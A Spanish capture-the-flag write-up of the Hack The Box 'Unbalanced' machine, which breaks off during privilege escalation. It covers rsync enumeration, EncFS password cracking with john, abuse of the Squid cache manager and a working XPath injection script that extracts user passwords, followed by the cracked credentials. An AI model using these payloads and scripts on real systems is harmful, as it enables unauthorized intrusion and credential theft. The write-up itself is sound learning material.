    "body": "2020/12/04 - M√°quina Linux nivel dif√≠cil. Nos enfrentaremos con encriptaci√≥n, mucho jugueteo con XML (romperemos una clave y encontraremos un XPATH injection que automatizaremos para extraer credenciales), explotaremos PiHole y sobre todo, enumeraremos demasiado (: TL;DR (Spanish writeup): Que bonita experiencia, primer maquina nivel dif√≠cil para m√≠: Empezaremos jugando con rsync para obtener un conjunto de archivos en el sistema, los copiaremos e investigando nos encontraremos con que estan encriptados mediante EncFS, tambi√©n enumerando :P tendremos un archivo que contiene la key que nos puede servir para obtener la contrase√±a y posteriormente desencriptar los archivos. Usaremos encfs2john. py para extraer informaci√≥n de . encfs6. xml, tendremos la contrase√±a bubblegum. Desencriptando los archivos, tendremos informaci√≥n √∫til de squid (otro de los servicios que corre la m√°quina). Jugaremos con el archivo squid. conf para obtener un conjunto de IP‚Äôs, iremos valid√°ndolas en la web. Una de ellas nos mostrara que valida lo que le pongamos, testeando con ella encontraremos un XPath Injection, aprovecharemos esto para extraer informaci√≥n del archivo XML, el proceso manual es poco efectivo, nos crearemos un script en Python para automatizar la extracci√≥n de contrase√±as de cada usuario (: para con ello obtener las credenciales del usuario brayan. Finalmente encontraremos que se est√° corriendo PiHole sobre un contenedor de Docker. Buscando por internet tendremos un exploit que vulnera la versi√≥n que tenemos, lo usaremos para entrar al sistema de archivos del contenedor, enumeraremos y encontraremos ‚Äúalgo‚Äù a lo que se nos hac√≠a referencia en el proceso, de ah√≠ obtendremos la contrase√±a ‚Äútemporal‚Äù del usuario root. Esto en ¬´pocas¬ª palabras, prend√°mosle candela‚Ä¶  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s me enfoco en plasmar mis errores y exitos (por si ves muuuucho texto). ‚Ä¶ Fases: Tendremos 3 fases. Enumeraci√≥n, explotaci√≥n y escalada de privilegios (:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Empezaremos realizando un escaneo de puertos sobre la m√°quina para saber que servicios est√° corriendo. ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 200 -oG initScan Es importante hacer un escaneo total, sin cambios, asi vaya lento, que nos permita ver si obviamos/pasamos alg√∫n puerto. En este caso no vamos a agregarle ning√∫n argumento de m√°s, ya que va bastante bien en cuanto a tiempo.       Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -Pn   Evita que realice Host Discovery, como ping (P) y el DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Thu Nov 12 25:25:25 2020 as: nmap -p- --open -v -Pn -oG initScan 10. 10. 10. 200# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 200 ()  Status: UpHost: 10. 10. 10. 200 ()  Ports: 22/open/tcp//ssh///, 873/open/tcp//rsync///, 3128/open/tcp//squid-http///Muy bien, tenemos los siguientes servicios arriba:       Puerto   Descripci√≥n         22   SSH: Secure Shell (Permite acceso remoto a un servidor)       873   rsync: Ofrece transmisi√≥n eficiente de datos incrementales, que opera tambi√©n con datos comprimidos y cifrados.        3128   squid-http: Squid es un servidor proxy para web con cach√©.    Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,873,3128 -sC -sV 10. 10. 10. 200 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Thu Nov 12 25:25:25 2020 as: nmap -p 22,873,3128 -sC -sV -oN portScan 10. 10. 10. 200Nmap scan report for 10. 10. 10. 200Host is up (0. 19s latency). PORT   STATE SERVICE  VERSION22/tcp  open ssh    OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)|  256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)|_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)873/tcp open rsync   (protocol version 31)3128/tcp open http-proxy Squid http proxy 4. 6|_http-server-header: squid/4. 6|_http-title: ERROR: The requested URL could not be retrievedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOk ok, veamos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 9p1       873   rsync   Protocol 31       3128   http-proxy   Squid proxy 4. 6   Perfecto, pues empecemos a ahondar en cada uno de ellos y ver por donde podemos vulnerar la m√°quina (: ‚Ä¶ Puerto 873 ~: Buscando por internet encontramos el siempre confiable cheatsheet de HackTricks en el que tenemos algunas pruebas hacia el puerto 873, veamos.  873-pentesting-rsync rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. HackingTricks-rsync Si nos conectamos mediante netcat nos responder√° con la versi√≥n del servicio, debemos enviar ese mismo output para que el server nos entable una conexi√≥n. Despu√©s validamos si existe alg√∫n recurso alojado. ‚Äì¬ª nc -vn 10. 10. 10. 200 873(UNKNOWN) [10. 10. 10. 200] 873 (rsync) open@RSYNCD: 31. 0   # Esta es la respuesta :P@RSYNCD: 31. 0   # Le respondemos#list       # Le decimos que nos liste recursosconf_backups  EncFS-encrypted configuration backups     # ~Tenemos cosillas@RSYNCD: EXIT   # El propio sistema cierra la conexi√≥nBien, ahora podemos usar otra utilidad que nos permita ver m√°s a fondo el contenido del recurso conf_backups, el cual seg√∫n vemos en la descripci√≥n son objetos de configuraci√≥n encriptados mediante EncFS.  EncFS es un sistema criptogr√°fico de archivos gratuito. Trabaja de forma transparente, utilizando un directorio arbitrario como almacenamiento para los archivos cifrados. Wikipedia ‚Äì¬ª rsync -av --list-only rsync://10. 10. 10. 200/conf_backupsreceiving incremental file listdrwxr-xr-x     4,096 2020/04/04 10:05:32 . -rw-r--r--      288 2020/04/04 10:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6-rw-r--r--      135 2020/04/04 10:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek-rw-r--r--     1,297 2020/04/02 08:06:19 . encfs6. xml-rw-r--r--      154 2020/04/04 10:05:32 0K72OfkNRRx3-f0Y6eQKwnjn-rw-r--r--       56 2020/04/04 10:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo--rw-r--r--      190 2020/04/04 10:05:32 2VyeljxHWrDX37La6FhUGIJS-rw-r--r--      386 2020/04/04 10:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1-rw-r--r--      537 2020/04/04 10:05:31 3cdBkrRF7R5bYe1ZJ0KYy786-rw-r--r--      560 2020/04/04 10:05:31 3xB4vSQH-HKVcOMQIs02Qb9,-rw-r--r--      275 2020/04/04 10:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1-rw-r--r--      463 2020/04/04 10:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,-rw-r--r--     2,169 2020/04/04 10:05:31 5FTRnQDoLdRfOEPkrhM2L29P-rw-r--r--      238 2020/04/04 10:05:31 5IUA28wOw0wwBs8rP5xjkFSs-rw-r--r--     1,277 2020/04/04 10:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg. . . #Otros m√°s -a: append, archive. (Permite mostrar todos los archivos de manera corta. ) -v: verbose. (Muestre por pantalla lo que va pasando. ) ‚Äìlist-only: Lista los archivos en lugar de copiarlos. Ahora que sabemos que si tiene contenido, intentemos copiarlo a nuestra m√°quina para despu√©s jugar :P ‚Äì¬ª mkdir rsync_files‚Äì¬ª cd rsync_files‚Äì¬ª rsync -av rsync://10. 10. 10. 200/conf_backups . De estos pasos podemos obtener info tal como fecha y tama√±o del archivo. Veamos que podemos hacer con estos archivos. Entre ellos hay un archivo oculto: ‚Äì¬ª ls -a.                        cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1 Ni8LDatT134DF6hhQf5ESpo5. .                        dF2GU58wFl3x5R7aDE6QEnDj            Nlne5rpWkOxkPNC15SEeJ8g,0K72OfkNRRx3-f0Y6eQKwnjn            dNTEvgsjgG6lKBr8ev8Dw,p7            OFG2vAoaW3Tvv1X2J5fy4UV827FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo- ECXONXBBRwhb5tYOIcjjFZzh            oPu0EVyHA6,KmoI1T,LTs83x2VyeljxHWrDX37La6FhUGIJS            . encfs6. xml                   OvBqims-kvgGyJJqZ59IbGfy3cdBkrRF7R5bYe1ZJ0KYy786            F4F9opY2nhVVnRgiQ,OUs-Y0            pfTT,nZnCUFzyPPOeX9NwQVo. . . Veamos su contenido: ‚Äì¬ª cat . encfs6. xml &lt;?xml version= 1. 0  encoding= UTF-8 ?&gt;&lt;!DOCTYPE boost_serialization&gt;&lt;boost_serialization signature= serialization::archive  version= 7 &gt;  &lt;cfg class_id= 0  tracking_level= 0  version= 20 &gt;    &lt;version&gt;20100713&lt;/version&gt;    &lt;creator&gt;EncFS 1. 9. 5&lt;/creator&gt;    &lt;cipherAlg class_id= 1  tracking_level= 0  version= 0 &gt;      &lt;name&gt;ssl/aes&lt;/name&gt;      &lt;major&gt;3&lt;/major&gt;      &lt;minor&gt;0&lt;/minor&gt;    &lt;/cipherAlg&gt;    &lt;nameAlg&gt;      &lt;name&gt;nameio/block&lt;/name&gt;      &lt;major&gt;4&lt;/major&gt;      &lt;minor&gt;0&lt;/minor&gt;    &lt;/nameAlg&gt;    &lt;keySize&gt;192&lt;/keySize&gt;    &lt;blockSize&gt;1024&lt;/blockSize&gt;    &lt;plainData&gt;0&lt;/plainData&gt;    &lt;uniqueIV&gt;1&lt;/uniqueIV&gt;    &lt;chainedNameIV&gt;1&lt;/chainedNameIV&gt;    &lt;externalIVChaining&gt;0&lt;/externalIVChaining&gt;    &lt;blockMACBytes&gt;0&lt;/blockMACBytes&gt;    &lt;blockMACRandBytes&gt;0&lt;/blockMACRandBytes&gt;    &lt;allowHoles&gt;1&lt;/allowHoles&gt;    &lt;encodedKeySize&gt;44&lt;/encodedKeySize&gt;    &lt;encodedKeyData&gt;GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=&lt;/encodedKeyData&gt;    &lt;saltLen&gt;20&lt;/saltLen&gt;    &lt;saltData&gt;mRdqbk2WwLMrrZ1P6z2OQlFl8QU=&lt;/saltData&gt;    &lt;kdfIterations&gt;580280&lt;/kdfIterations&gt;    &lt;desiredKDFDuration&gt;500&lt;/desiredKDFDuration&gt;  &lt;/cfg&gt;&lt;/boost_serialization&gt;Buscando hay varias cosas interesantes, entre ellas destaco:  En caso de perder ese archivo (cualquier escenario, sea como usuario o atacante) no tendremos posibilidades de desencriptar los archivos.  Dentro est√° la llave encriptada con la que podr√≠amos desencriptar todo el conjunto de archivos.  Hay un post en espec√≠fico que muestra como podr√≠amos desencriptar el archivo mediante python y john. ‚Ä¶ Explotaci√≥n #: Siguiendo la idea del post, usa un script llamado encfs2john. py, encontr√© este en GitHub, us√©moslo.  B√°sicamente toma la carpeta donde est√© el archivo encfs6. xml y extrae varios argumentos, que con ellos armara el hash que intentaremos crackear con john.  Juega con bytes y base64 para ir almacenando la data desencriptada. ‚Äì¬ª wget https://raw. githubusercontent. com/truongkma/ctf-tools/master/John/run/encfs2john. py‚Äì¬ª chmod +x encfs2john. py‚Äì¬ª python encfs2john. py rsync_files/ &gt; encfs. xml. john‚Äì¬ª cat encfs. xml. john rsync_files/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add‚Äì¬ª john --wordlist=/usr/share/wordlists/rockyou. txt encfs. xml. john Using default input encoding: UTF-8Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])Cost 1 (iteration count) is 580280 for all loaded hashesPress 'q' or Ctrl-C to abort, almost any other key for statusbubblegum    (rsync_files/)1g 0:00:01:04 DONE (2020-11-12 25:25) 0. 01550g/s 11. 16p/s 11. 16c/s 11. 16C/s zacefron. . marissaUse the  --show  option to display all of the cracked passwords reliablySession completedPeeeeeeerfecto, tenemos en texto plano el resultado: bubblegum. Ahora a desencriptar los archivos, siguiendo esta guia en un punto nos ense√±a como podr√≠amos hacerlo. (¬´Monta¬ª una montura mientras manejemos los archivos). ‚Äì¬ª encfs ~/rsync_files/ ~/rsync_plain  #Con esto le indicamos que el resultado lo guarde en la carpeta `rsync_plain` (tienen que ser rutas absolutas). Contrase√±a EncFS:‚Äì¬ª ls rsync_plain/50-localauthority. conf       debconf. conf          fuse. conf    libaudit. conf   networkd. conf          rsyncd. conf   udev. conf50-nullbackend. conf         debian. conf           gai. conf     libc. conf     nsswitch. conf          rsyslog. conf  update-initramfs. conf51-debian-sudo. conf         deluser. conf          group. conf    limits. conf    org. freedesktop. PackageKit. conf semanage. conf  user. conf70debconf              dhclient. conf          hdparm. conf   listchanges. conf PackageKit. conf         sepermit. conf  user-dirs. conf99-sysctl. conf           discover-modprobe. conf     host. conf    logind. conf    pam. conf             sleep. conf   Vendor. confaccess. conf             dkms. conf            initramfs. conf  logrotate. conf  pam_env. conf           squid. conf   wpa_supplicant. confadduser. conf            dns. conf            input. conf    main. conf     parser. conf           sysctl. conf   x86_64-linux-gnu. confbluetooth. conf           dnsmasq. conf          journald. conf  mke2fs. conf    protect-links. conf        system. conf   xattr. confca-certificates. conf        docker. conf           kernel-img. conf modules. conf   reportbug. conf          time. confcom. ubuntu. SoftwareProperties. conf fakeroot-x86_64-linux-gnu. conf ldap. conf    namespace. conf  resolv. conf           timesyncd. confdconf                framework. conf         ld. so. conf    network. conf   resolved. conf          ucf. conf. . . #Si queremos terminar la montura le indicamos:‚Äì¬ª fusermount -u rsync_plainPuerto 3128 ~: Listo, recorramos los archivos y ver que cositas interesantes hay (: Tenemos un archivo que se relaciona con lo que encontramos en el escaneo inicial: squid. conf. ‚Äì¬ª cat squid. conf#    WELCOME TO SQUID 4. 6#    ----------------------------##    This is the documentation for the Squid configuration file. #    This documentation can also be found online at:#        http://www. squid-cache. org/Doc/config/##    You may wish to look at the Squid home page and wiki for the#    FAQ and other documentation:#        http://www. squid-cache. org/#        http://wiki. squid-cache. org/SquidFaq#        http://wiki. squid-cache. org/ConfigExamples##    This documentation shows what the defaults for various directives#    happen to be.  If you don't need to change the default, you should#    leave the line out of your squid. conf in most cases. . . . Es bastante grande, pero la mayor√≠a (seg√∫n entiendo) son l√≠neas comentadas, hagamos que nos muestre solo las lineas sin #, √≥sea las que no estan comentadas :P ‚Äì¬ª cat squid. conf | grep -v  #  | uniqacl SSL_ports port 443acl CONNECT method CONNECThttp_access deny !Safe_portshttp_access deny CONNECT !SSL_portshttp_access allow managerinclude /etc/squid/conf. d/*http_access allow localhostacl intranet dstdomain -n intranet. unbalanced. htbacl intranet_net dst -n 172. 16. 0. 0/12http_access allow intranethttp_access allow intranet_nethttp_access deny allhttp_port 3128coredump_dir /var/spool/squidrefresh_pattern ^ftp:      1440  20%   10080refresh_pattern ^gopher:    1440  0%   1440refresh_pattern -i (/cgi-bin/|\?) 0   0%   0refresh_pattern .        0    20%   4320cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable allcache disable Cuando quitamos los # quedan muchos saltos de l√≠nea, por ello usamos uniq, para que evite mostrar l√≠neas repetidas (:Listo, mucho m√°s f√°cil, adem√°s a simple vista tenemos cositas interesantes:  Vemos dos dominios nuevos: intranet. unbalanced. htb y 172. 16. 0. 0 (Esta es una red privada).  El puerto con el que nos encontramos inicialmente: 3128.  Solo permite el acceso a los dos dominios: http_access allow intranet y http_access allow intranet_net, de resto: http_access deny all.  Me llama la atenci√≥n esta string: cachemgr_passwd Thah$Sh1. Inicialmente no hab√≠a entendido en enfoque y agregue el dominio al /etc/hosts, pero despu√©s de retroceder y leer que ten√≠a un proxy, fue m√°s f√°cil retomar las ideas. Entonces sabemos que squid es un proxy, solo se nos permite el acceso a los dominios encontrados, si jugamos primero con curL podremos validar la respuesta, luego iremos a la web para configurar el proxy y jugar desde ah√≠. Le indicamos que nos muestre lo que vaya pasando (-v: verbose) al conectarnos al dominio intranet. unbalanced. htb pero mediante el proxy (-x o ‚Äìproxy :P) que tenemos en 10. 10. 10. 200 sobre el puerto 3128. ‚Äì¬ª curl -v http://intranet. unbalanced. htb --proxy 10. 10. 10. 200:3128*  Trying 10. 10. 10. 200:3128. . . * TCP_NODELAY set* Connected to 10. 10. 10. 200 (10. 10. 10. 200) port 3128 (#0)&gt; GET http://intranet. unbalanced. htb/ HTTP/1. 1&gt; Host: intranet. unbalanced. htb&gt; User-Agent: curl/7. 68. 0&gt; Accept: */*&gt; Proxy-Connection: Keep-Alive&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1. 1 302 Found&lt; Server: nginx/1. 14. 0 (Ubuntu)&lt; Date: Sun, 15 Nov 2020 21:04:36 GMT&lt; Content-Type: text/html; charset=UTF-8&lt; Location: intranet. php&lt; Intranet-Host: intranet-host3. unbalanced. htb&lt; X-Cache: MISS from unbalanced&lt; X-Cache-Lookup: MISS from unbalanced:3128&lt; Transfer-Encoding: chunked&lt; Via: 1. 1 unbalanced (squid/4. 6)&lt; Connection: keep-alive&lt; * Connection #0 to host 10. 10. 10. 200 left intactPerfecto obtenemos respuesta v√°lida (adem√°s que nos lleva a intranet. php), vamos para la web y configuramos un par de cosas, en mi caso en Firefox :):  Segu√≠ esta guia. Y ahora validemos en la web: Muy bien, lo siguiente ser√° jugar con el logging √°rea que tenemos y los apartados de la izquierda. Entre la b√∫squeda de informaci√≥n encontr√© este post en el que podemos confirmar que Thah$Sh1 es una contrase√±a, probablemente la usemos dentro de poco (: Despu√©s de un tiempo perdido, decid√≠ buscar ayuda, le hable a @TazWake, miembro activo de HTB. Me indico que revisara muy bien el archivo, ya que se nos est√° permitiendo el acceso a otro recurso y pr√°cticamente nos est√° diciendo que podemos ver con ese recurso‚Ä¶ Pues despu√©s de esto, vi que tenemos acceso a manager: http_access allow managerEs una utilidad que muestra estad√≠sticas sobre los procesos llevados a cabo por squid, adem√°s de ser una buena manera de llevar la cache. Podemos ver la info mediante la herramienta squidclient. Esta es la data que nos interesa: cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable allEsto nos indica que la contrase√±a para autenticarnos hacia el proxy es Thah$Sh1 y que podemos ver informaci√≥n mediante estos argumentos: men√∫ pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events.  As√≠ mismo encontr√© esta tabla donde se detalla el uso de cada uno.  Tambi√©n nos indica la sintaxis de como se usa manager. ‚Äì¬ª squidclient -h 10. 10. 10. 200 -p 3128 -w 'Thah$Sh1' mgr:menuHTTP/1. 1 200 OKServer: squid/4. 6Mime-Version: 1. 0Date: Tue, 17 Nov 2020 20:32:20 GMTContent-Type: text/plain;charset=utf-8Expires: Tue, 17 Nov 2020 20:32:20 GMTLast-Modified: Tue, 17 Nov 2020 20:32:20 GMTX-Cache: MISS from unbalancedX-Cache-Lookup: MISS from unbalanced:3128Via: 1. 1 unbalanced (squid/4. 6)Connection: close index         Cache Manager Interface         disabled menu          Cache Manager Menu           protected offline_toggle     Toggle offline_mode setting       disabled shutdown        Shut Down the Squid Process       disabled reconfigure      Reconfigure Squid            disabled rotate         Rotate Squid Logs            disabled pconn         Persistent Connection Utilization Histograms  protected mem          Memory Utilization           protected diskd         DISKD Stats               protected squidaio_counts    Async IO Function Counters       disabled config         Current Squid Configuration       disabled client_list      Cache Client List            disabled comm_epoll_incoming  comm_incoming() stats          disabled ipcache        IP Cache Stats and Contents       disabled fqdncache       FQDN Cache Stats and Contents      protected idns          Internal DNS Statistics         disabled . . . Nos muestra los argumentos a los que tenemos acceso, viendo el output de cada uno (los que tenemos en squid. conf o los que en el anterior output nos indique protected) obtenemos uno interesante: ‚Äì¬ª squidclient -h 10. 10. 10. 200 -p 3128 -w 'Thah$Sh1' mgr:fqdncacheHTTP/1. 1 200 OKServer: squid/4. 6Mime-Version: 1. 0Date: Wed, 18 Nov 2020 05:03:59 GMTContent-Type: text/plain;charset=utf-8Expires: Wed, 18 Nov 2020 05:03:59 GMTLast-Modified: Wed, 18 Nov 2020 05:03:59 GMTX-Cache: MISS from unbalancedX-Cache-Lookup: MISS from unbalanced:3128Via: 1. 1 unbalanced (squid/4. 6)Connection: closeFQDN Cache Statistics:FQDNcache Entries In Use: 11FQDNcache Entries Cached: 8FQDNcache Requests: 6FQDNcache Hits: 0FQDNcache Negative Hits: 0FQDNcache Misses: 6FQDN Cache Contents:Address                    Flg TTL Cnt Hostnames127. 0. 1. 1                    H -001  2 unbalanced. htb unbalanced::1                       H -001  3 localhost ip6-localhost ip6-loopback172. 31. 179. 2                  H -001  1 intranet-host2. unbalanced. htb172. 31. 179. 3                  H -001  1 intranet-host3. unbalanced. htb127. 0. 0. 1                    H -001  1 localhost172. 17. 0. 1                   H -001  1 intranet. unbalanced. htbff02::1                     H -001  1 ip6-allnodesff02::2                     H -001  1 ip6-allrouters FQDN es un nombre de dominio completo que incluye el nombre de la computadora y el nombre de dominio asociado a ese equipo. Wikipedia  Info sobre fqdncache. Tenemos las direcciones y resoluciones DNS, vemos el dominio en donde estamos intranet. unbalanced. htb y los posibles dominios a los que debamos movernos‚Ä¶ Validando 172. 31. 179. 2 y 172. 31. 179. 3 son id√©nticas a intranet. unbalanced. htb (172. 17. 0. 1). Estuve bastante tiempo perdido ac√°, no vi algo sencillo. ¬øNo falta algo entre 172. 31. 179. 2 y 172. 31. 179. 3?, pues s√≠, revisemos 172. 31. 179. 1:  Info sobre load balancerEntiendo que no se nos mostr√≥ en la cache ya que la ‚Äúquitaron‚Äù para no dejar rastro (que por lo visto estaban teniendo problemas con ella) pero pues‚Ä¶ (: Veamos si podemos encontrar algo con gobuster. ‚Äì¬ª gobuster dir -u http://172. 31. 179. 1 -p http://10. 10. 10. 200:3128 -b 404,403 -w /opt/SecLists/Discovery/Web-Content/raft-small-files. txt -t 100===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:           http://172. 31. 179. 1[+] Threads:         100[+] Wordlist:        /opt/SecLists/Discovery/Web-Content/raft-small-files. txt[+] Negative Status codes:  403,404[+] Proxy:          http://10. 10. 10. 200:3128[+] User Agent:       gobuster/3. 0. 1[+] Timeout:         10s===============================================================2020/25/25 25:25:25 Starting gobuster===============================================================/index. php (Status: 200)/. (Status: 301)/intranet. php (Status: 200)===============================================================2020/25/25 25:25:25 Finished===============================================================Y si vamos a /intranet. php tenemos la misma p√°gina que las otras direcciones, pero en este caso al ingresar los datos y validarlos nos indica si son correctas o no :) Despu√©s de un gran testeo de varias cositas, encontramos una vulnerabilidad XPath Injection en el campo Password. Con un simple hola' or '1 explota :P  Los ataques de inyecci√≥n XPath se producen cuando un sitio web utiliza la informaci√≥n suministrada por el usuario para construir una consulta XPath para datos XML. [Wikipedia] Alguna info sobre ella:  Testing for XPath Injection - OWASP XPath Injection - HackTricksObtenemos esto: Vemos unos usuarios con su respectiva informaci√≥n‚Ä¶ Ac√° estuve buscando y buscando pero lo que probaba no me funcionaba. Estaba en un enfoque v√°lido pero con mala sintaxis, gracias a la ayuda de nuevo de @TazWake me redirecciono, yo estaba intentando extraer los nombre de las filas, para con ello validar si hab√≠a otro campo que no se mostraba inicialmente (no me daba respuesta la p√°gina). Para con esto validar si el primer car√°cter del primer usuario era 'r' de 'rita': ' or substring(user(/[position()=1]),1,1)='r' or 'Pero no hab√≠a intentado algo m√°s f√°cil (ac√° fue donde me ayudo @TazWake). Usando el mismo nombre del campo: ' or substring(Username,1,1)='r' or ' Perfecto, ahora solo nos muestra ese registro, lo que sigue es validar lo mismo pero con el campo Password, para esto podemos crearnos un script que nos ayude‚Ä¶ Tuve un problema y era que la letra que encontraba en el campo Password pod√≠a ser de cualquier usuario, simplemente la primera similitud hacia que pasara a la siguiente letra, por lo tanto obten√≠a una palabra con la mezcla de las contrase√±as, as√≠ que la idea era que inicialmente tome un Username como referencia y a ese Username le extrajera el Password**. Despu√©s de varios problemas e intentar cosas ‚Äúdif√≠ciles‚Äù o dejar de intentar cosas :( intente esta l√≠nea: ' or substring(Username,1,4)='rita' and substring(Password,1,1)='a' or 'Esto jugando ya con bucles, arrays y dem√°s cositas nos quedar√≠a as√≠: password =  ' or substring(Username,1,4)='rita' and substring(Password,%d,1)='%s' or '  % (posicion, letra)Que finalmente nos da como contrase√±a: password01!. Modificando mejor el script para que tome de una vez cada usuario y le extraiga su contrase√±a: #!/usr/bin/python3 import requests, refrom pwn import *intranet_url =  http://172. 31. 179. 1/intranet. php proxy = { http  :  http://10. 10. 10. 200:3128 }try:  p1 = log. progress( XPath exploit )  axyz =  abcdefghijklmnopqrstuvwxyz0123456789!\ #$%&amp;\'()*+,-. /:;&lt;=&gt;?@[\\]^_`{|}~ABCDEFGHIJKLMNOPQRSTUVWXYZ   username =  anY0ne   users_array = [ rita ,  jim ,  bryan ,  sarah ]  letter_found =     for name in users_array:    p2 = log. progress( Username )    p2. status( %s =   % (name))    length_name = len(name)    #Hacemos de cuenta que la cadena tiene un tama√±o maximo de 24 caracteres.     for col in range(1, 25):      #Probamos cada letra, numero y simbolo del la variable -axyz-.       for letter_array in axyz:        password =  ' or substring(Username,1,%d)='%s' and substring(Password,%d,1)='%s' or '  % (length_name, name, col, letter_array)        p1. status( %s  % (password))        data_post = {           Username  : username,           Password  : password        }        req = requests. post(intranet_url, data=data_post, proxies=proxy, timeout=10)                try:          juicy = re. findall(r'&lt;div class= w3-row-padding w3-grayscale &gt;&lt;div class= w3-col m4 w3-margin-bottom &gt;&lt;div class= w3-light-grey &gt;&lt;p class=\'w3-opacity\'&gt;(. *)', req. text)          #Cuando el payload se ejecuta y se crea esta etiqueta sabemos que nos mostro algo del XML, tomamos la letra en que sucedio y la guardamos en una variable, para asi ir armando la password          if juicy:            letter_found += letter_array            p2. status( %s = %s  % (name, letter_found))            break        except:          p2. failure( The ju1cy failed :( )    p2. success( %s = %s  % (name, letter_found))    letter_found =     p1. success( w3 4r3 d0n3 (: )except requests. exceptions. ReadTimeout:  p2. failure( t1m3:(0ut ) Ac√° queda el script por si algo :PObtenemos este output: Tenemos credenciales para probar en SSH, rsync o en el mismo login.       Username   Password         rita   password01!       jim   stairwaytoheaven       bryan   ireallyl0vebubblegum!!!       sarah   sarah4evah   Si probamos con SSH cada credencial, las del usuario que tiene como rol System Administrator √≥sea bryan nos otorga acceso a la m√°quina y tenemos el flag user. txt :) Escalada de privilegios #: Tenemos un archivo en el que se listan las tareas hechas y por hacer: bryan@unbalanced:~$ cat TODO ############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127. 0. 0. 1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO]bryan@unbalanced:~$ La primera parte Intranet nos explica (o bueno bryan nos da un recorrido) del por que y que se hizo para ‚Äúarreglar‚Äù toooda la primera fase que hicimos :) La segunda es donde nos vamos a enfocar, nos indica que existe un contenedor que mantiene la imagen pi-hole.  Pi-hole es un software de c√≥digo abierto que proporciona bloqueo de anuncios (y m√°s) para toda su red dom√©stica. Lo hace bloqueando dominios conocidos que publican anuncios e incluso tiene la capacidad de bloquear solicitudes de red a dominios maliciosos si el nombre de dominio est√° contenido en una de las listas de bloqueo. En resumen Pi-hole act√∫a como un hoyo negro de anuncios. MoisesSerrano. com Validando comandos de Docker nos da un: /docker. sock: connect: permission denied. Veamos el servicio docker en el sistema: bryan@unbalanced:~$ systemctl status docker‚óè docker. service - Docker Application Container Engine  Loaded: loaded (/lib/systemd/system/docker. service; enabled; vendor preset: enabled)  Active: active (running) since Fri 2020-11-20 00:10:23 EST; 11h ago   Docs: https://docs. docker. com Main PID: 671  Tasks: 40  Memory: 156. 1M  CGroup: /system. slice/docker. service      ‚îú‚îÄ 671 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd. sock      ‚îú‚îÄ1005 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 8080 -container-ip 172. 31. 11. 3 -container-port 80      ‚îú‚îÄ1020 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 5553 -container-ip 172. 31. 11. 3 -container-port 53      ‚îî‚îÄ1039 /usr/bin/docker-proxy -proto udp -host-ip 127. 0. 0. 